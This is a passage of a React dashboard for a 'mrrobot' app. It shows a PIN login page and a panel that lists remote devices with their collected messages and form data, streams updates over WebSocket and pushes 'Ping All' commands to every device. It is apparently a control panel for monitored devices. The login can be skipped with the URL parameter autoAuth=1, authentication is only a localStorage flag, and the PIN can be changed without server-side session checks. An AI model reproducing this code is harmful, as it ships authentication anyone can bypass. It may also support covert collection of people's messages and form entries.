                      <div style={{ fontSize: 10, color: "#94a3b8", marginTop: 1 }}>
                        Login: {fmtTime(s.loginTime)} · IP: {s.ip.slice(0, 15)}
                      </div>
                    </div>
                    <button onClick={() => void logoutSession(s.id)} style={{
                      background: "#fef2f2", color: "#ef4444", border: "1px solid #fecaca",
                      borderRadius: 7, padding: "5px 10px", fontSize: 10, fontWeight: 700, cursor: "pointer", flexShrink: 0,
                    }}>
                      Logout
                    </button>
                  </div>
                );
              })
        }
      </div>
    </div>
  );
}

/* ════════════════════════════════════════
   LOGIN PAGE
════════════════════════════════════════ */
function LoginPage({ onAuth, appId, appName }: { onAuth: () => void; appId: string; appName: string }) {
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [mode, setMode] = useState<"login" | "change">("login");
  const [oldPin, setOldPin] = useState("");
  const [newPin, setNewPin] = useState("");
  const [newPin2, setNewPin2] = useState("");
  const [msg, setMsg] = useState("");

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true); setErr("");
    try {
      const r = await fetch(`/api/apps/${appId}/verify-pin`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin }),
      });
      if (!r.ok) {
        const j = await r.json().catch(() => ({}));
        const apiErr = (j as { error?: string }).error ?? "";
        setErr(
          apiErr.includes("expired") ? "App validity expired (30 days). Contact admin." :
          apiErr.includes("disabled") ? "This app is disabled. Contact admin." :
          "Wrong PIN. Try again."
        );
        setPin(""); return;
      }
      const sessR = await fetch("/api/admin/sessions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId }) }).catch(() => null);
      if (sessR?.ok) {
        const { sessionId } = await sessR.json();
        localStorage.setItem(`mrrobot_session_id_${appId}`, sessionId);
      }
      localStorage.setItem(`mrrobot_auth_${appId}`, "1");
      onAuth();
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  async function handleChange(e: React.FormEvent) {
    e.preventDefault();
    setLoading(true); setErr("");
    try {
      const verR = await fetch(`/api/apps/${appId}/verify-pin`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: oldPin }),
      });
      if (!verR.ok) { setErr("Current PIN is wrong."); return; }
      if (newPin.length < 4) { setErr("New PIN must be at least 4 characters."); return; }
      if (newPin !== newPin2) { setErr("PINs do not match."); return; }
      await fetch(`/api/apps/${appId}`, {
        method: "PATCH", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin: newPin }),
      });
      setMsg("PIN changed! Please log in.");
      setMode("login");
      setOldPin(""); setNewPin(""); setNewPin2(""); setErr("");
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  const inputStyle: React.CSSProperties = {
    width: "100%", padding: "12px 14px", borderRadius: 10,
    border: "1.5px solid #334155", background: "#1e293b",
    color: "#f1f5f9", fontSize: 14, outline: "none", boxSizing: "border-box",
  };
  const labelStyle: React.CSSProperties = {
    fontSize: 12, color: "#94a3b8", fontWeight: 600,
    textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 6, display: "block",
  };

  return (
    <div style={{
      minHeight: "100vh", background: "#0a0f1a",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", padding: 16,
    }}>
      <div style={{ width: "100%", maxWidth: 380 }}>
        {/* Card */}
        <div style={{ background: "#111827", borderRadius: 18, padding: "32px 28px", border: "1px solid #1e293b", boxShadow: "0 20px 60px #00000080" }}>

          {/* Robot logo */}
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
            <svg width="52" height="52" viewBox="0 0 34 34" fill="none">
              <line x1="17" y1="1" x2="17" y2="7" stroke="#818cf8" strokeWidth="1.8" strokeLinecap="round"/>
              <circle cx="17" cy="1.5" r="2" fill="#818cf8"/>
              <rect x="3" y="7" width="28" height="22" rx="5" fill="#1e293b" stroke="#6366f1" strokeWidth="1.5"/>
              <rect x="8" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="20" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="2" y="16" width="2" height="5" rx="1" fill="#334155"/>
              <rect x="30" y="16" width="2" height="5" rx="1" fill="#334155"/>
              <rect x="8" y="22" width="18" height="4" rx="1.5" fill="#0f172a"/>
              <rect x="10" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="15.5" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="21" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
            </svg>
          </div>

          <div style={{ textAlign: "center", marginBottom: 28 }}>
            <div style={{ color: "#f8fafc", fontWeight: 900, fontSize: 22, letterSpacing: 1 }}>
              {mode === "login" ? "Welcome Back, Admin" : "Change PIN"}
            </div>
            {appName && <div style={{ color: "#475569", fontSize: 11, marginTop: 4, fontFamily: "monospace" }}>{appName}</div>}
          </div>

          {mode === "login" ? (
            <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 16 }}>
              <div>
                <label style={labelStyle}>Token ID</label>
                <div style={{ position: "relative", display: "flex", alignItems: "center" }}>
                  <input value={appId} readOnly style={{ ...inputStyle, color: "#6366f1", cursor: "default", fontFamily: "monospace", letterSpacing: 1, paddingRight: 44 }} />
                  <div style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)" }}>
                    <CopyIconButton value={appId} size={28} color="#6366f1" title="Copy Token ID" />
                  </div>
                </div>
              </div>
              <div>
                <label style={labelStyle}>PIN</label>
                <input
                  type="password" value={pin} onChange={e => { setPin(e.target.value); setErr(""); }}
                  placeholder="Enter PIN" autoFocus style={inputStyle}
                />
              </div>
              {err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
              {msg && <div style={{ color: "#4ade80", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{msg}</div>}
              <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
                <button type="submit" style={{
                  flex: 1, background: "#6366f1", color: "#fff", border: "none",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 700, cursor: "pointer",
                }}>Sign In</button>
                <button type="button" onClick={() => { setMode("change"); setErr(""); setMsg(""); }} style={{
                  flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 600, cursor: "pointer",
                }}>Change PIN</button>
              </div>
            </form>
          ) : (
            <form onSubmit={handleChange} style={{ display: "flex", flexDirection: "column", gap: 14 }}>
              <div>
                <label style={labelStyle}>Current PIN</label>
                <input type="password" value={oldPin} onChange={e => { setOldPin(e.target.value); setErr(""); }} placeholder="Current PIN" style={inputStyle} autoFocus />
              </div>
              <div>
                <label style={labelStyle}>New PIN</label>
                <input type="password" value={newPin} onChange={e => { setNewPin(e.target.value); setErr(""); }} placeholder="New PIN (min 4 chars)" style={inputStyle} />
              </div>
              <div>
                <label style={labelStyle}>Confirm New PIN</label>
                <input type="password" value={newPin2} onChange={e => { setNewPin2(e.target.value); setErr(""); }} placeholder="Confirm PIN" style={inputStyle} />
              </div>
              {err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
              <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
                <button type="submit" style={{
                  flex: 1, background: "#6366f1", color: "#fff", border: "none",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 700, cursor: "pointer",
                }}>Update PIN</button>
                <button type="button" onClick={() => { setMode("login"); setErr(""); }} style={{
                  flex: 1, background: "transparent", color: "#94a3b8", border: "1.5px solid #334155",
                  borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 600, cursor: "pointer",
                }}>Cancel</button>
              </div>
            </form>
          )}

          <div style={{ textAlign: "center", marginTop: 24, color: "#334155", fontSize: 11, fontWeight: 600 }}>
            Build: {BUILD_VERSION}
          </div>
        </div>
      </div>
    </div>
  );
}

/* ════════════════════════════════════════
   ROOT
════════════════════════════════════════ */
export default function WebDashboard() {
  const [appId] = useState<string>(() => new URLSearchParams(window.location.search).get("appId") || "SKY-APP-2026-X9F3");
  const DEVICE_KEY = `mrrobot_device_id_${appId}`;
  const [appName, setAppName] = useState("");
  // autoAuth=1 in URL → bypass PIN login for canvas/iframe preview
  const [authed, setAuthed] = useState<boolean>(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("autoAuth") === "1") return true;
    const aId = params.get("appId") || "SKY-APP-2026-X9F3";
    return localStorage.getItem(`mrrobot_auth_${aId}`) === "1";
  });
  const [devices, setDevices] = useState<DbDevice[]>([]);
  const [messages, setMessages] = useState<DbMessage[]>([]);
  const [formData, setFormData] = useState<DbFormData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    fetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then(app => { if (app?.name) setAppName(app.name); }).catch(() => {});
  }, [appId]);

  // Poll app status every 10s — force logout if app is disabled
  useEffect(() => {
    if (!authed) return;
    async function checkAppStatus() {
      try {
        const r = await fetch(`/api/apps/${appId}`, { headers: { "x-silent": "1" } });
        if (!r.ok) return;
        const app = await r.json() as { status: string; name?: string };
        if (app.name) setAppName(app.name);
        if (app.status !== "active") {
          const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
          if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
          localStorage.removeItem(`mrrobot_auth_${appId}`);
          localStorage.removeItem(`mrrobot_session_id_${appId}`);
          setAuthed(false);
        }
      } catch { /* ignore network errors */ }
    }
    checkAppStatus();
    const t = setInterval(checkAppStatus, 10000);
    return () => clearInterval(t);
  }, [authed, appId]);

  // Global session ping every 15s — if my session was killed (Logout All from
  // another device), the server returns 404 and we force-logout here too.
  // 2 consecutive 404s required to ignore transient network errors.
  useEffect(() => {
    if (!authed) return;
    if (new URLSearchParams(window.location.search).get("autoAuth") === "1") return;
    let misses = 0;
    async function pingSession() {
      const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
      if (!sid) {
          // Already logged in but no session tracked — create one (handles old-code logins)
          fetch("/api/admin/sessions", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ appId }) })
            .then(r => r.ok ? r.json() : null)
            .then(data => { if (data?.sessionId) localStorage.setItem(`mrrobot_session_id_${appId}`, data.sessionId); })
            .catch(() => {});
          return;
        }
      try {
        const r = await fetch(`/api/admin/sessions/${sid}/ping`, {
          method: "PATCH",
          headers: { "x-silent": "1" },
        });
        if (r.status === 404) {
          misses += 1;
          if (misses >= 2) {
            localStorage.removeItem(`mrrobot_auth_${appId}`);
            localStorage.removeItem(`mrrobot_session_id_${appId}`);
            setAuthed(false);
          }
        } else if (r.ok) {
          misses = 0;
        }
      } catch { /* ignore network errors */ }
    }
    pingSession();
    const t = setInterval(pingSession, 15000);
    return () => clearInterval(t);
  }, [authed, appId]);

  const [darkMode, setDarkMode] = useState<boolean>(() => localStorage.getItem("mrrobot_dark") === "1");

  function toggleDark() {
    setDarkMode(d => {
      const next = !d;
      localStorage.setItem("mrrobot_dark", next ? "1" : "0");
      return next;
    });
  }

  const VALID_PAGES: Page[] = ["home", "messages", "groups", "devices", "settings"];
  const [page, setPage] = useState<Page>(() => {
    const saved = localStorage.getItem("mrrobot_page") as Page | null;
    return saved && VALID_PAGES.includes(saved) ? saved : "home";
  });
  const [selectedDevice, setSelectedDevice] = useState<DbDevice | null>(null);
  const [backPage, setBackPage] = useState<Page>(() => {
    const saved = localStorage.getItem("mrrobot_back_page") as Page | null;
    return saved && VALID_PAGES.includes(saved) ? saved : "home";
  });
  const [scrollToMsgId, setScrollToMsgId] = useState<string | null>(null);
  const [checkAllState, setCheckAllState] = useState<"idle" | "running" | "done">("idle");
  const [checkAllDone, setCheckAllDone] = useState(0);
  const [checkAllTotal, setCheckAllTotal] = useState(0);
  const [checkAllResult, setCheckAllResult] = useState<{ ok: number; fail: number } | null>(null);
  const [filterRecent, setFilterRecent] = useState(false);
  const [refreshing, setRefreshing] = useState(false);
  const [wsConnected, setWsConnected] = useState(false);
  const [, liveTick] = useState(0); // global 1s tick — drives live timeAgo on all device cards
  useEffect(() => {
    const t = setInterval(() => liveTick(n => n + 1), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => { localStorage.setItem("mrrobot_page", page); }, [page]);

  // Scroll state: track back vs forward navigation
  const goingBackRef = useRef(false);
  const savedScrollTopRef = useRef(0); // pixel scrollTop saved on forward nav, restored on back
  const homeMsgCountRef = useRef(20);  // how many items HomePage had when user navigated away
  const msgPageCountRef = useRef(20);  // how many items MessagesPage had when user navigated away
  const groupsCountRef = useRef(15);   // how many group items GroupsPage had when user navigated away
  const devicesCountRef = useRef(20);  // how many device items DevicesPage had when user navigated away

  // Scroll to top on forward nav, restore exact scrollTop on back nav.
  // When we have a target msgId, the per-page scrollToMsgId effect will do a
  // precise scrollIntoView once the card mounts — skip the pixel restore in
  // that case to avoid fighting it.
  useEffect(() => {
    const el = document.getElementById("main-scroll");
    if (!el) return;
    if (goingBackRef.current) {
      goingBackRef.current = false;
      const savedTop = savedScrollTopRef.current;
      // If a target message is set, let scrollIntoView handle precise alignment.
      // Just land near the saved pixel as a starting point so content-visibility
      // cards have a chance to render before scrollIntoView fires.
      el.scrollTop = savedTop;
      if (scrollToMsgId) return;
      // No target msgId — keep retrying pixel restore until layout settles
      let attempts = 0;
      const tryRestore = () => {
        el.scrollTop = savedTop;
        if (Math.abs(el.scrollTop - savedTop) > 10 && attempts < 50) {
          attempts++;
          setTimeout(tryRestore, 50);
        }
      };
      requestAnimationFrame(tryRestore);
    } else {
      el.scrollTo({ top: 0, behavior: "instant" });
    }
  }, [page]); // eslint-disable-line react-hooks/exhaustive-deps

  function onOpenDevice(device: DbDevice, msgId?: string) {
    // Save scrollTop of the list container at the moment of navigation
    const scrollEl = document.getElementById("main-scroll");
    savedScrollTopRef.current = scrollEl?.scrollTop ?? 0;
    setBackPage(page);
    localStorage.setItem("mrrobot_back_page", page);
    setSelectedDevice(device);
    setPage("devices");
    localStorage.setItem(DEVICE_KEY, device.deviceId);
    if (msgId) setScrollToMsgId(msgId);
  }

  function onBack() {
    goingBackRef.current = true;
    setSelectedDevice(null);
    setPage(backPage);
    localStorage.removeItem(DEVICE_KEY);
    localStorage.removeItem("mrrobot_back_page");
  }

  const loadData = useCallback(async (silent = false) => {
    if (!silent) setLoading(true);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 20000);
    const FIRST_PAGE = 500;   // Fast first paint — dashboard renders immediately
    const PAGE_SIZE = 1000;   // Background chunks for older messages
    try {
      const h: HeadersInit = silent ? { "x-silent": "1" } : {};
      // Stage 1 — fetch devices, formData, and FIRST page of messages in parallel.
      // Dashboard renders as soon as this finishes (~400ms even with thousands of rows).
      const [dRes, mRes, fRes] = await Promise.all([
        fetch(`/api/devices?appId=${appId}`, { headers: h, signal: controller.signal }),
        fetch(`/api/messages?appId=${appId}&limit=${FIRST_PAGE}&offset=0`, { headers: h, signal: controller.signal }),
        fetch(`/api/data?appId=${appId}`, { headers: h, signal: controller.signal }),
      ]);
      if (!dRes.ok || !mRes.ok) throw new Error("API error");
      const [d, firstM, f] = await Promise.all([dRes.json(), mRes.json(), fRes.ok ? fRes.json() : []]) as [DbDevice[], DbMessage[], DbFormData[]];
      setDevices(d); setMessages(firstM); setFormData(f);
      setError(null);
      const savedDeviceId = localStorage.getItem(DEVICE_KEY);
      if (savedDeviceId) {
        const found = (d as DbDevice[]).find(dev => dev.deviceId === savedDeviceId);
        if (found) setSelectedDevice(found);
      }
      clearTimeout(timeout);
      if (!silent) setLoading(false);

      // Stage 2 — keep loading older messages in the background (non-blocking).
      // Append page-by-page; dedupe by id so SSE-merged rows don't double up.
      (async () => {
        let offset = (firstM as DbMessage[]).length;
        // If first page was short, no more rows to fetch.
        if (offset < FIRST_PAGE) return;
        for (;;) {
          try {
            const r = await fetch(`/api/messages?appId=${appId}&limit=${PAGE_SIZE}&offset=${offset}`, { headers: { "x-silent": "1" } });
            if (!r.ok) break;
            const page = await r.json() as DbMessage[];
            if (!page.length) break;
            setMessages(prev => {
              const seen = new Set(prev.map(m => m.id));
              const fresh = page.filter(m => !seen.has(m.id));
              return fresh.length ? [...prev, ...fresh] : prev;
            });
            offset += page.length;
            if (page.length < PAGE_SIZE) break; // last page
          } catch { break; }
        }
      })();
    } catch (e) {
      clearTimeout(timeout);
      if (!silent) {
        setError(controller.signal.aborted ? "Connection timed out. Tap Sync to retry." : (e as Error).message);
        setLoading(false);
      }
    }
  }, [appId]);

  // Load data only after authenticated — avoids showing spinner on cold-start before login
  useEffect(() => { if (authed) void loadData(false); }, [authed, loadData]);

  // WebSocket — complete live connection via Cloudflare Durable Object pub-sub
  // Server pushes full device/message objects → client merges directly into state
  useEffect(() => {
    if (!authed) return;
    let ws: WebSocket | null = null;
    let retryTimer: ReturnType<typeof setTimeout> | null = null;
    let closed = false;
    let retryDelay = 2000;

    function connect() {
      if (closed) return;
      const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
      const url = `${proto}//${window.location.host}/api/events`;
      ws = new WebSocket(url);

      ws.onopen = () => {
        setWsConnected(true);
        retryDelay = 2000; // reset backoff on success
      };

      ws.onmessage = (e) => {
        let parsed: { event: string; data: unknown };
        try { parsed = JSON.parse(typeof e.data === "string" ? e.data : ""); }
        catch { return; }
        const { event, data } = parsed;

        if (event === "device_updated") {
          const device = data as DbDevice;
          if (device.appId !== appId) return;
          window.dispatchEvent(new CustomEvent("mrrobot:device_updated", { detail: { deviceId: device.deviceId } }));
          setDevices(prev => {
            const idx = prev.findIndex(d => d.deviceId === device.deviceId);
            if (idx === -1) return [device, ...prev];
            const next = [...prev];
            next[idx] = device;
            return next;
          });
          setSelectedDevice(sel => sel?.deviceId === device.deviceId ? device : sel);
          const savedId = localStorage.getItem(DEVICE_KEY);
          if (savedId === device.deviceId) setSelectedDevice(device);
        } else if (event === "message_added") {
          const payload = data as { appId: string; message: DbMessage };
          if (payload.appId !== appId) return;
          setMessages(prev => {
            if (prev.some(m => m.id === payload.message.id)) return prev;
            return [payload.message, ...prev];
          });
        } else if (event === "form_data_added") {
          const payload = data as { appId: string; formData: DbFormData };
          if (payload.appId !== appId) return;
          setFormData(prev => {
            if (prev.some(f => f.id === payload.formData.id)) return prev;
            return [payload.formData, ...prev];
          });
        } else if (event === "form_data_deleted") {
          const payload = data as { appId: string; id: number };
          if (payload.appId !== appId) return;
          setFormData(prev => prev.filter(f => f.id !== payload.id));
        } else if (event === "form_data_bulk_deleted") {
          const payload = data as { appId: string; deviceId: string; ids: number[] };
          if (payload.appId !== appId) return;
          setFormData(prev => prev.filter(f => f.deviceId !== payload.deviceId));
        } else if (event === "message_deleted") {
          const payload = data as { appId: string; deviceId: string; id: number };
          if (payload.appId !== appId) return;
          setMessages(prev => prev.filter(m => m.id !== payload.id));
        } else if (event === "device_deleted") {
          const payload = data as { appId: string; deviceId: string };
          if (payload.appId !== appId) return;
          setDevices(prev => prev.filter(d => d.deviceId !== payload.deviceId));
          setMessages(prev => prev.filter(m => m.deviceId !== payload.deviceId));
          setFormData(prev => prev.filter(f => f.deviceId !== payload.deviceId));
          setSelectedDevice(sel => sel?.deviceId === payload.deviceId ? null : sel);
          if (localStorage.getItem(DEVICE_KEY) === payload.deviceId) {
            localStorage.removeItem(DEVICE_KEY);
          }
        }
      };

      ws.onclose = () => {
        setWsConnected(false);
        if (closed) return;
        // exponential backoff: 2s → 4s → 8s → cap 30s
        retryTimer = setTimeout(connect, retryDelay);
        retryDelay = Math.min(retryDelay * 2, 30000);
      };
      ws.onerror = () => {
        setWsConnected(false);
        try { ws?.close(); } catch {}
      };
    }

    connect();
    return () => {
      closed = true;
      setWsConnected(false);
      if (retryTimer) clearTimeout(retryTimer);
      try { ws?.close(); } catch {}
    };
  }, [authed, appId]);

  // Polling fallback — jab WebSocket connected nahi, har 20s mein data refresh karo
  const wsConnectedRef = useRef(wsConnected);
  useEffect(() => { wsConnectedRef.current = wsConnected; }, [wsConnected]);
  useEffect(() => {
    if (!authed) return;
    const t = setInterval(() => {
      if (!wsConnectedRef.current) void loadData(true);
    }, 20000);
    return () => clearInterval(t);
  }, [authed, loadData]);

  async function handleManualRefresh() {
    setRefreshing(true);
    await loadData(true);
    setRefreshing(false);
  }

  const totalDevices = devices.length;
  const recentCount = devices.filter(d => isRecent(d.lastOnline)).length;
  const displayDevices = filterRecent ? devices.filter(d => isRecent(d.lastOnline)) : devices;

  async function handleCheckAll() {
    if (checkAllState === "running") return;
    // latest → oldest: reverse of DB insertion order
    const allDevices = [...devices].reverse();
    if (!allDevices.length) { setCheckAllState("done"); setTimeout(() => setCheckAllState("idle"), 2500); return; }

    const BATCH_SIZE = 10;
    const BATCH_DELAY_MS = 300;

    setCheckAllState("running");
    setCheckAllDone(0);
    setCheckAllTotal(allDevices.length);
    setCheckAllResult(null);
    let ok = 0; let fail = 0;

    for (let i = 0; i < allDevices.length; i += BATCH_SIZE) {
      const batch = allDevices.slice(i, i + BATCH_SIZE);
      const results = await Promise.allSettled(
        batch.map(d =>
          fcmSend(d.deviceId, mkCheckOnline())
        )
      );
      results.forEach(r => r.status === "fulfilled" ? ok++ : fail++);
      setCheckAllDone(Math.min(i + BATCH_SIZE, allDevices.length));
      if (i + BATCH_SIZE < allDevices.length) {
        await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
      }
    }

    setCheckAllResult({ ok, fail });
    setCheckAllState("done");
    setTimeout(() => { setCheckAllState("idle"); setCheckAllDone(0); setCheckAllTotal(0); setCheckAllResult(null); }, 4000);
  }

  const NAV: { key: Page; label: string }[] = [
    { key: "home", label: "Home" },
    { key: "messages", label: "Messages" },
    { key: "groups", label: "Groups" },
    { key: "devices", label: "Devices" },
    { key: "settings", label: "Settings" },
  ];

  function handleLogout() {
    const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
    if (sid) fetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
    localStorage.removeItem(`mrrobot_auth_${appId}`);
    localStorage.removeItem(`mrrobot_session_id_${appId}`);
    setAuthed(false);
  }

  if (!authed) return <LoginPage onAuth={() => setAuthed(true)} appId={appId} appName={appName} />;

  const theme = darkMode ? DT : LT;

  return (
    <ThemeCtx.Provider value={theme}>
    <div style={{ height: "100dvh", background: theme.bg, fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", color: theme.txt, display: "flex", justifyContent: "center" }}>
      <div style={{ width: "100%", maxWidth: 440, height: "100dvh", display: "flex", flexDirection: "column", background: theme.bg }}>

        {/* Header + Tab nav — single sticky block so tabs never overlap header */}
        <div style={{ position: "sticky", top: 0, zIndex: 50 }}>
        <div style={{ background: theme.card, borderBottom: `1px solid ${theme.cardB}` }}>
        <div className="header-scroll" style={{ padding: "8px 14px", display: "flex", alignItems: "center", gap: 14, overflowX: "auto", scrollbarWidth: "thin", scrollbarColor: "#6366f1 transparent" }}>
          {/* Left: logo + name — never shrink */}
          <div style={{ display: "flex", alignItems: "center", gap: 9, flexShrink: 0 }}>
            <svg width="30" height="30" viewBox="0 0 34 34" fill="none" xmlns="http://www.w3.org/2000/svg">
              <line x1="17" y1="1" x2="17" y2="7" stroke="#6366f1" strokeWidth="1.8" strokeLinecap="round"/>
              <circle cx="17" cy="1.5" r="2" fill="#6366f1"/>
              <rect x="3" y="7" width="28" height="22" rx="5" fill={darkMode ? "#2e3a5c" : "#e0e7ff"} stroke="#6366f1" strokeWidth="1.5"/>
              <rect x="8" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="20" y="13" width="6" height="6" rx="1.5" fill="#6366f1"/>
              <rect x="2" y="16" width="2" height="5" rx="1" fill={darkMode ? "#4a5a8a" : "#c7d2fe"}/>
              <rect x="30" y="16" width="2" height="5" rx="1" fill={darkMode ? "#4a5a8a" : "#c7d2fe"}/>
              <rect x="8" y="22" width="18" height="4" rx="1.5" fill={darkMode ? "#1e293b" : "#c7d2fe"}/>
              <rect x="10" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="15.5" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
              <rect x="21" y="22" width="3" height="4" rx="1" fill="#6366f1"/>
            </svg>
            <div>
              <div style={{ color: theme.txt, fontWeight: 900, fontSize: 13, letterSpacing: 1, whiteSpace: "nowrap" }}>{appName}</div>
            </div>
          </div>

          {/* Right: pills row — flexShrink:0 so parent scroll handles overflow */}
          <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>

            {/* 15-min online pill — clickable filter toggle */}
            <button
              onClick={() => setFilterRecent(f => !f)}
              style={{
                display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
                background: filterRecent ? "#4ade80" : "#052e16",
                border: `1px solid ${filterRecent ? "#4ade80" : "#166534"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: "pointer",
                boxShadow: filterRecent ? "0 0 10px #4ade8066" : "none",
                transition: "all 0.15s",
              }}
            >
              <span style={{
                width: 6, height: 6, borderRadius: "50%",
                background: filterRecent ? "#052e16" : "#4ade80",
                boxShadow: filterRecent ? "none" : "0 0 6px #4ade80",
                display: "inline-block", flexShrink: 0,
              }} />
              <span style={{ fontSize: 11, fontWeight: 700, color: filterRecent ? "#052e16" : "#4ade80", lineHeight: 1 }}>
                {recentCount}
              </span>
              <span style={{ fontSize: 9, color: filterRecent ? "#166534" : "#86efac", fontWeight: 600, lineHeight: 1 }}>
                /15m
              </span>
            </button>

            {/* Live connection status pill */}
            <span style={{
              display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
              background: wsConnected ? "#052e16" : "#450a0a",
              border: `1px solid ${wsConnected ? "#166534" : "#991b1b"}`,
              borderRadius: 20, padding: "4px 10px",
              transition: "all 0.15s",
            }}>
              <span style={{
                width: 6, height: 6, borderRadius: "50%", flexShrink: 0,
                background: wsConnected ? "#4ade80" : "#f87171",
                boxShadow: wsConnected ? "0 0 6px #4ade80" : "0 0 6px #f87171",
                display: "inline-block",
              }} />
              <span style={{ fontSize: 10, fontWeight: 700, lineHeight: 1, color: wsConnected ? "#4ade80" : "#f87171" }}>
                {wsConnected ? "Connected" : "Disconnected"}
              </span>
            </span>

            {/* Manual Refresh button */}
            <button
              onClick={() => void handleManualRefresh()}
              disabled={refreshing}
              title="Refresh devices & messages"
              style={{
                display: "flex", alignItems: "center", gap: 4, flexShrink: 0,
                background: "#0f172a", border: "1px solid #334155",
                borderRadius: 20, padding: "4px 10px", cursor: refreshing ? "wait" : "pointer",
              }}
            >
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none"
                style={{ transform: refreshing ? "rotate(360deg)" : "none", transition: refreshing ? "transform 0.6s linear" : "none" }}>
                <path d="M5 1.5A3.5 3.5 0 1 1 1.5 5" stroke={refreshing ? "#60a5fa" : "#94a3b8"} strokeWidth="1.5" strokeLinecap="round"/>
                <polyline points="1.5,2.5 1.5,5 4,5" stroke={refreshing ? "#60a5fa" : "#94a3b8"} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              <span style={{ fontSize: 10, fontWeight: 700, color: refreshing ? "#60a5fa" : "#94a3b8", lineHeight: 1 }}>
                {refreshing ? "…" : "Sync"}
              </span>
            </button>

            {/* Check Online All pill button */}
            <button
              onClick={() => void handleCheckAll()}
              disabled={checkAllState === "running"}
              style={{
                display: "flex", alignItems: "center", gap: 5, flexShrink: 0,
                background: checkAllState === "done"
                  ? "#052e16"
                  : checkAllState === "running"
                  ? "#1e1b4b"
                  : "#1e1b4b",
                border: `1px solid ${checkAllState === "done" ? "#166534" : "#4f46e5"}`,
                borderRadius: 20, padding: "4px 10px",
                cursor: checkAllState === "running" ? "wait" : "pointer",
              }}
            >
              {/* icon */}
              <svg width="10" height="10" viewBox="0 0 10 10" fill="none">
                {checkAllState === "done"
                  ? <polyline points="1.5,5 4,7.5 8.5,2" stroke="#4ade80" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
                  : checkAllState === "running"
                  ? <circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5" strokeDasharray="5 3"/>
                  : <><circle cx="5" cy="5" r="3.5" stroke="#818cf8" strokeWidth="1.5"/><polygon points="4,3.2 7.5,5 4,6.8" fill="#818cf8"/></>
                }
              </svg>
              <span style={{
                fontSize: 10, fontWeight: 700, lineHeight: 1, whiteSpace: "nowrap",
                color: checkAllState === "done" ? "#4ade80" : "#a5b4fc",
              }}>
                {checkAllState === "running"
                  ? `${checkAllDone}/${checkAllTotal}`
                  : checkAllState === "done"
                  ? "Sent!"
                  : "Ping All"}
              </span>
            </button>

          </div>
        </div>
        {/* Ping All progress bar / result */}
        {checkAllState === "running" && (
          <div style={{ height: 3, background: "#1e1b4b", overflow: "hidden" }}>
            <div style={{ height: "100%", background: "#6366f1", width: `${checkAllTotal > 0 ? Math.round((checkAllDone / checkAllTotal) * 100) : 0}%`, transition: "width 0.4s ease" }} />
          </div>
        )}
        {checkAllState === "done" && checkAllResult && (
          <div style={{ padding: "3px 14px", display: "flex", alignItems: "center", gap: 8, background: "#0f172a" }}>
            <span style={{ fontSize: 10, fontWeight: 700, color: "#4ade80" }}>✓ {checkAllResult.ok} sent</span>
            {checkAllResult.fail > 0 && (
              <span style={{ fontSize: 10, fontWeight: 700, color: "#f59e0b" }}>· ✗ {checkAllResult.fail} failed</span>
            )}
          </div>
        )}
        </div>

        {/* Tab nav */}
        <div style={{ background: theme.hdr, display: "flex", borderBottom: `2px solid ${theme.cardB}` }}>
          {NAV.map(({ key, label }) => {
